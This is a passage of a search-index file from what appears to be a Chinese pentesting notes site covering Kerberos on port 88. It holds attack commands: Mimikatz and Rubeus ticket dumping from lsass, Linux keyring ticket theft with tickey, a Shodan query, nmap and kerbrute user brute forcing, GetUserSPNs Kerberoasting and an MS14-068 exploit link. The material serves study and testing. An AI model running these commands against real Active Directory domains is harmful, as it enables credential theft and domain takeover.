\u4e2a\u72ec\u7279\u7684\u7ec4\u4ef6\u7ec4\u6210\uff1a\u6807\u5934\u3001\u9ed8\u8ba4\u4e3b\u4f53\u548c\u4e00\u7cfb\u5217\u51ed\u636e\u3002keyring \u4fdd\u5b58\u9ed8\u8ba4\u4e3b\u4f53\u548c\u51ed\u636e\u3002\u8be5\u811a\u672c\u5c06\u8fd9\u4e9b\u7ec4\u4ef6\u8f6c\u50a8\u5230\u5355\u72ec\u7684\u6587\u4ef6\u3002\u7136\u540e\uff0c\u4f7f\u7528\u653b\u51fb\u8005\u5408\u6210\u7684\u6807\u5934\uff0c\u8fd9\u4e9b\u90e8\u5206\u6309\u6b63\u786e\u7684\u987a\u5e8f\u5408\u5e76\u6210\u4e00\u4e2a\u91cd\u5efa\u6587\u4ef6 ccache\u3002\u91cd\u5efa\u7684\u6587\u4ef6\u53ef\u4ee5\u63a8\u51fa\u5230\u653b\u51fb\u8005\u673a\u5668\uff0c\u7136\u540e\u7528\u6765\u6a21\u62df Kerberos \u7528\u6237\u3002\u7528\u4e8e\u751f\u6210\u6709\u6548 ccache \u6807\u5934\u7684\u7b80\u5355\u7a0b\u5e8f\u53ef\u4ee5\u5728 A.3 \u8282\u4e2d\u770b\u5230\u3002 \u57fa\u4e8e heracles.sh \u811a\u672c \uff08\u6765\u81ea\u8bba\u6587\uff09\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u7684 C \u5de5\u5177\uff08\u7531\u5b8c\u6574\u5e16\u5b50\u7684\u4f5c\u8005\u521b\u5efa\uff09\u662f tikey \uff0c\u5b83\u4ece\u5bc6\u94a5\u73af\u4e2d\u63d0\u53d6\u95e8\u7968\uff1a /tmp/tickey -i Shodan port:88 kerberos MS14-068 \u7b80\u5355\u6765\u8bf4\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u901a\u8fc7\u6dfb\u52a0\u4e00\u4e2a\u9519\u8bef\u58f0\u660e\uff08\u5373\u7528\u6237\u662f Domain Admins \u7ec4\uff08\u6216\u5176\u4ed6\u654f\u611f\u7ec4\uff09\u7684\u6210\u5458\uff09\u6765\u4fee\u6539\u73b0\u6709\u7684\u6709\u6548\u7684\u57df\u7528\u6237\u767b\u5f55\u4ee4\u724c\uff08Kerberos Ticket Granting Ticket\uff0cTGT \u7968\u636e\uff09\uff0c\u57df\u63a7\u5236\u5668\uff08DC\uff09\u5c06\u9a8c\u8bc1\u8be5\u58f0\u660e\uff0c\u4ece\u800c\u4f7f\u653b\u51fb\u8005\u4e0d\u5f53\u5730\u8bbf\u95ee\u7f51\u7edc\u4e0a AD \u68ee\u6797\u4e2d\u4efb\u4f55\u57df\u7684\u8d44\u6e90\u3002 \u5176\u4ed6\u6f0f\u6d1e: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek \u81ea\u52a8\u5316\u547d\u4ee4 Protocol_Name: Kerberos #\u5982\u679c\u6709\u7684\u8bdd\uff0c\u534f\u8bae\u7f29\u5199\u3002 Port_Number: 88 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u901a\u8fc7\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: AD Domain Authentication #\u62fc\u5199\u51fa\u534f\u8bae\u7f29\u5199 Entry_1: Name: Notes Description: Notes for Kerberos Note: | Firstly, Kerberos is an authentication protocol, not authorization. In other words, it allows to identify each user, who provides a secret password, however, it does not validates to which resources or services can this user access. Kerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is the responsability of each service to determine if the user has access to its resources. https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88 Entry_2: Name: Pre-Creds Description: Brute Force to get Usernames Command: nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"{Domain_Name}\",userdb={Big_Userlist} {IP} Entry_3: Name: With Usernames Description: Brute Force with Usernames and Passwords Note: consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h Entry_4: Name: With Creds Description: Attempt to get a list of user service principal names Command: GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs","title":"88 - tcp/udp-kerberos\u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"\u9996\u5148\uff0cKerberos \u662f\u4e00\u79cd\u8ba4\u8bc1\u534f\u8bae\uff0c\u800c\u4e0d\u662f\u6388\u6743\u534f\u8bae\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u5141\u8bb8\u8bc6\u522b\u6bcf\u4e2a\u63d0\u4f9b\u5bc6\u7801\u7684\u7528\u6237\uff0c\u4f46\u4e0d\u4f1a\u9a8c\u8bc1\u7528\u6237\u5bf9\u54ea\u4e9b\u8d44\u6e90\u6216\u670d\u52a1\u5177\u6709\u8bbf\u95ee\u6743\u9650\u3002 Kerberos \u5728 Active Directory \u4e2d\u4f7f\u7528\u3002\u5728\u8fd9\u4e2a\u5e73\u53f0\u4e2d\uff0cKerberos \u63d0\u4f9b\u6bcf\u4e2a\u7528\u6237\u7684\u6743\u9650\u4fe1\u606f\uff0c\u4f46\u662f\u786e\u5b9a\u7528\u6237\u662f\u5426\u5177\u6709\u8bbf\u95ee\u5176\u8d44\u6e90\u7684\u8d23\u4efb\u5728\u4e8e\u6bcf\u4e2a\u670d\u52a1\u3002 \u9ed8\u8ba4\u7aef\u53e3: 88/tcp/udp PORT STATE SERVICE 88/tcp open kerberos-sec","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"","title":"\u66f4\u591a"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#windows","text":"\u5728 Windows \u4e2d\uff0c\u7968\u8bc1\u7531\u8d1f\u8d23\u5b89\u5168\u6027\u7684 lsass\uff08\u672c\u5730\u5b89\u5168\u673a\u6784\u5b50\u7cfb\u7edf\u670d\u52a1\uff09\u8fdb\u7a0b\u5904\u7406\u548c\u5b58\u50a8\u3002 \u56e0\u6b64\uff0c\u8981\u4ece Windows \u7cfb\u7edf\u68c0\u7d22\u7968\u8bc1\uff0c\u6709\u5fc5\u8981 \u4e0e lsass \u901a\u4fe1\u5e76\u8bf7\u6c42\u5b83\u4eec \u3002\u4f5c\u4e3a \u975e\u7ba1\u7406\u5458\u7528\u6237\u53ea\u80fd\u83b7\u53d6\u62e5\u6709\u7684\u7968 \uff0c\u4f46\u662f\u4f5c\u4e3a\u673a\u5668 \u7ba1\u7406\u5458 \uff0c\u53ef\u4ee5\u83b7\u53d6 \u6240\u6709\u7968\u3002 \u4e3a\u6b64\uff0c\u53ef\u4ee5\u4f7f\u7528 Mimikatz \u6216 Rubeus\u5de5\u5177 \uff0c\u5982\u4e0b\u6240\u793a\uff1a # Using mimikatz sekurlsa::tickets /export # Using Rubeus ## Dump all tickets .\\Rubeus dump [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"<BASE64_TICKET>\")) ## List all tickets .\\Rubeus.exe triage ## Dump the interesting one by luid .\\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"<BASE64_TICKET>\"))","title":"\u4ece Windows \u83b7\u53d6\u7968\u636e"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#linux","text":"\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u7968\u636e\u50a8\u5b58\u5728\u51ed\u636e\u7f13\u5b58\uff08credential caches\uff09\u6216 ccaches \u4e2d\u3002\u51ed\u636e\u7f13\u5b58\u662f\u4e00\u79cd\u5b58\u50a8\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f\u7684\u6570\u636e\u7ed3\u6784\uff0c\u7528\u4e8e\u5728 Linux \u7cfb\u7edf\u4e0a\u50a8\u5b58\u548c\u7ba1\u7406\u7968\u636e\u3002\u5b83\u6709 3 \u79cd\u4e3b\u8981\u7c7b\u578b\uff0c\u8fd9\u4e9b\u7c7b\u578b\u8868\u793a\u7968\u636e\u53ef\u4ee5\u5728\u54ea\u91cc\u627e\u5230\uff1a FILE\uff1a\u8868\u793a\u7968\u636e\u50a8\u5b58\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u8def\u5f84\u8bbf\u95ee\u3002 KEYRING\uff1a\u8868\u793a\u7968\u636e\u50a8\u5b58\u5728\u5185\u6838\u7684\u79d8\u94a5\u73af\uff08keyring\uff09\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u5185\u6838\u63a5\u53e3\u8bbf\u95ee\u3002 MEMORY\uff1a\u8868\u793a\u7968\u636e\u50a8\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u53ea\u80fd\u901a\u8fc7\u5f53\u524d\u8fdb\u7a0b\u8bbf\u95ee\u3002 \u56e0\u6b64\uff0c\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u7968\u636e\u50a8\u5b58\u5728\u51ed\u636e\u7f13\u5b58\u6216 ccaches \u4e2d\uff0c\u6709 3 \u79cd\u4e3b\u8981\u7c7b\u578b\uff0c\u6307\u793a\u7968\u636e\u53ef\u4ee5\u5728\u54ea\u91cc\u627e\u5230\u3002 \u4e3a\u4e86\u68c0\u67e5\u67d0\u53f0\u7279\u5b9a\u673a\u5668\u4f7f\u7528\u7684\u5b58\u50a8\u7c7b\u578b\uff0c\u5fc5\u987b\u5728 /etc/krb5.conf \u6587\u4ef6\u4e2d\u68c0\u67e5 default_ccache_name \u53d8\u91cf\u3002\u8be5\u6587\u4ef6\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5bf9\u4efb\u4f55\u7528\u6237\u90fd\u6709\u8bfb\u6743\u9650\u3002\u5982\u679c\u8fd9\u4e2a\u53c2\u6570\u4e22\u5931\u4e86\uff0c\u5b83\u7684\u9ed8\u8ba4\u503c\u662f FILE:/tmp/krb5cc_%{uid} \u3002 \u4e3a\u4e86 \u4ece\u5176\u4ed6 2 \u4e2a\u6765\u6e90 \uff08\u5bc6\u94a5\u73af\u548c\u8fdb\u7a0b\uff09\u4e2d\u63d0\u53d6\u7968\u8bc1\uff0c2017 \u5e74\u53d1\u5e03\u7684\u4e00\u7bc7\u5f88\u68d2\u7684\u8bba\u6587 Kerberos Credential Thievery (GNU/Linux) \u89e3\u91ca\u4e86\u4ece\u4e2d\u6062\u590d\u7968\u8bc1\u7684\u65b9\u6cd5\u3002","title":"\u4ece Linux \u83b7\u53d6\u7968\u636e"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#-paper","text":"Linux \u5185\u6838\u5177\u6709\u4e00\u4e2a\u540d\u4e3a keyrings \u7684\u529f\u80fd\u3002\u8fd9\u662f\u4e00\u4e2a\u9a7b\u7559\u5728\u5185\u6838\u4e2d\u7684\u5185\u5b58\u533a\u57df\uff0c\u7528\u4e8e\u7ba1\u7406\u548c\u4fdd\u7559\u5bc6\u94a5\u3002 keyctl \u7cfb\u7edf\u8c03\u7528\u5728\u5185\u6838\u7248\u672c 2.6.10 5 \u4e2d\u5f15\u5165\u3002\u5b83\u4e3a\u7528\u6237\u7a7a\u95f4\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u4e2a API\uff0c\u53ef\u4ee5\u7528\u5b83\u6765\u4e0e\u5185\u6838 keyrings \u4ea4\u4e92\u3002 \u5185\u6838 keyring \u7684\u540d\u79f0\u53ef\u4ee5\u4ece Kerberos \u914d\u7f6e\u6587\u4ef6 /etc/krb5.conf \u89e3\u6790\uff0c\u8be5\u6587\u4ef6\u9ed8\u8ba4\u5bf9\u4efb\u4f55\u4eba\u90fd\u5177\u6709\u8bfb\u6743\u9650\uff08\u516b\u8fdb\u5236 644\uff09\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u641c\u7d22\u5305\u542b keyring \u7684\u7968\u636e 11\uff0c\u5e76\u63d0\u53d6\u7968\u636e\u3002\u5b9e\u73b0\u6b64\u529f\u80fd\u7684\u6982\u5ff5\u9a8c\u8bc1\u811a\u672c\u53ef\u4ee5\u5728 A.2 \u8282\uff08hercules.sh\uff09\u4e2d\u770b\u5230\u3002\u5728 keyring \u4e2d\uff0cccache \u88ab\u5b58\u50a8\u4e3a\u7ec4\u4ef6\u3002\u5982\u56fe 2 \u6240\u793a\uff0c\u6587\u4ef6 ccache \u7531 3 \u4e2a\u72ec\u7279\u7684\u7ec4\u4ef6\u7ec4\u6210\uff1a\u6807\u5934\u3001\u9ed8\u8ba4\u4e3b\u4f53\u548c\u4e00\u7cfb\u5217\u51ed\u636e\u3002keyring \u4fdd\u5b58\u9ed8\u8ba4\u4e3b\u4f53\u548c\u51ed\u636e\u3002\u8be5\u811a\u672c\u5c06\u8fd9\u4e9b\u7ec4\u4ef6\u8f6c\u50a8\u5230\u5355\u72ec\u7684\u6587\u4ef6\u3002\u7136\u540e\uff0c\u4f7f\u7528\u653b\u51fb\u8005\u5408\u6210\u7684\u6807\u5934\uff0c\u8fd9\u4e9b\u90e8\u5206\u6309\u6b63\u786e\u7684\u987a\u5e8f\u5408\u5e76\u6210\u4e00\u4e2a\u91cd\u5efa\u6587\u4ef6 ccache\u3002\u91cd\u5efa\u7684\u6587\u4ef6\u53ef\u4ee5\u63a8\u51fa\u5230\u653b\u51fb\u8005\u673a\u5668\uff0c\u7136\u540e\u7528\u6765\u6a21\u62df Kerberos \u7528\u6237\u3002\u7528\u4e8e\u751f\u6210\u6709\u6548 ccache \u6807\u5934\u7684\u7b80\u5355\u7a0b\u5e8f\u53ef\u4ee5\u5728 A.3 \u8282\u4e2d\u770b\u5230\u3002 \u57fa\u4e8e heracles.sh \u811a\u672c \uff08\u6765\u81ea\u8bba\u6587\uff09\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u7684 C \u5de5\u5177\uff08\u7531\u5b8c\u6574\u5e16\u5b50\u7684\u4f5c\u8005\u521b\u5efa\uff09\u662f tikey \uff0c\u5b83\u4ece\u5bc6\u94a5\u73af\u4e2d\u63d0\u53d6\u95e8\u7968\uff1a /tmp/tickey -i","title":"\u79d8\u94a5\u73af - \u6765\u81ea paper"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#shodan","text":"port:88 kerberos","title":"Shodan"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#ms14-068","text":"\u7b80\u5355\u6765\u8bf4\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u901a\u8fc7\u6dfb\u52a0\u4e00\u4e2a\u9519\u8bef\u58f0\u660e\uff08\u5373\u7528\u6237\u662f Domain Admins \u7ec4\uff08\u6216\u5176\u4ed6\u654f\u611f\u7ec4\uff09\u7684\u6210\u5458\uff09\u6765\u4fee\u6539\u73b0\u6709\u7684\u6709\u6548\u7684\u57df\u7528\u6237\u767b\u5f55\u4ee4\u724c\uff08Kerberos Ticket Granting Ticket\uff0cTGT \u7968\u636e\uff09\uff0c\u57df\u63a7\u5236\u5668\uff08DC\uff09\u5c06\u9a8c\u8bc1\u8be5\u58f0\u660e\uff0c\u4ece\u800c\u4f7f\u653b\u51fb\u8005\u4e0d\u5f53\u5730\u8bbf\u95ee\u7f51\u7edc\u4e0a AD \u68ee\u6797\u4e2d\u4efb\u4f55\u57df\u7684\u8d44\u6e90\u3002 \u5176\u4ed6\u6f0f\u6d1e: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek","title":"MS14-068"},{"location":"Network%20Prot/88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"Protocol_Name: Kerberos #\u5982\u679c\u6709\u7684\u8bdd\uff0c\u534f\u8bae\u7f29\u5199\u3002 Port_Number: 88 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u901a\u8fc7\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: AD Domain Authentication #\u62fc\u5199\u51fa\u534f\u8bae\u7f29\u5199 Entry_1: Name: Notes Description: Notes for Kerberos Note: | Firstly, Kerberos is an authentication protocol, not authorization. In other words, it allows to identify each user, who provides a secret password, however, it does not validates to which resources or services can this user access. Kerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is the responsability of each service to determine if the user has access to its resources. https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88 Entry_2: Name: Pre-Creds Description: Brute Force to get Usernames Command: nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"{Domain_Name}\",userdb={Big_Userlist} {IP} Entry_3: Name: With Usernames Description: Brute Force with Usernames and Passwords Note: consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h Entry_4: Name: With Creds Description: Attempt to get a list of user service principal names Command: GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs","title":"\u81ea\u52a8\u5316\u547d\u4ee4"},{"location":"Network%20Prot/Readme/","text":"\u5b66\u4ec0\u4e48\u5b66\uff1f \u8eba\u5e73\u4e0d\u597d\u4e48\uff1f\u522b\u5f53\u4e2a\u5377\u738b\uff0c\u5185\u5377\u5c31\u662f\u9000\u6b65\u7684\u5f00\u59cb\uff01 \u8fd9\ud83e\udde0\u771f\u7684\u4e0d\u8fdb\u77e5\u8bc6\u5440\uff01","title":"Readme"},{"location":"Network%20Prot/Readme/#_1","text":"\u8eba\u5e73\u4e0d\u597d\u4e48\uff1f\u522b\u5f53\u4e2a\u5377\u738b\uff0c\u5185\u5377\u5c31\u662f\u9000\u6b65\u7684\u5f00\u59cb\uff01 \u8fd9\ud83e\udde0\u771f\u7684\u4e0d\u8fdb\u77e5\u8bc6\u5440\uff01","title":"\u5b66\u4ec0\u4e48\u5b66\uff1f"},{"location":"Web%20Pentesting/Readme/","text":"\u5b66\u4ec0\u4e48\u5b66\uff1f \u8eba\u5e73\u4e0d\u597d\u4e48\uff1f\u522b\u5f53\u4e2a\u5377\u738b\uff0c\u5185\u5377\u5c31\u662f\u9000\u6b65\u7684\u5f00\u59cb\uff01 \u8fd9\ud83e\udde0\u771f\u7684\u4e0d\u8fdb\u77e5\u8bc6\u5440\uff01 \u8fd8\u6ca1\u5f00\u59cb\u6574\u7406 \u8bf7\u7b49\u5f85\u3002\u3002\u3002","title":"Readme"},{"location":"Web%20Pentesting/Readme/#_1","text":"\u8eba\u5e73\u4e0d\u597d\u4e48\uff1f\u522b\u5f53\u4e2a\u5377\u738b\uff0c\u5185\u5377\u5c31\u662f\u9000\u6b65\u7684\u5f00\u59cb\uff01 \u8fd9\ud83e\udde0\u771f\u7684\u4e0d\u8fdb\u77e5\u8bc6\u5440\uff01","title":"\u5b66\u4ec0\u4e48\u5b66\uff1f"},{"location":"Web%20Pentesting/Readme/#_2","text":"","title":"\u8fd8\u6ca1\u5f00\u59cb\u6574\u7406"},{"location":"Web%20Pentesting/Readme/#_3","text":"","title":"\u8bf7\u7b49\u5f85\u3002\u3002\u3002"}]}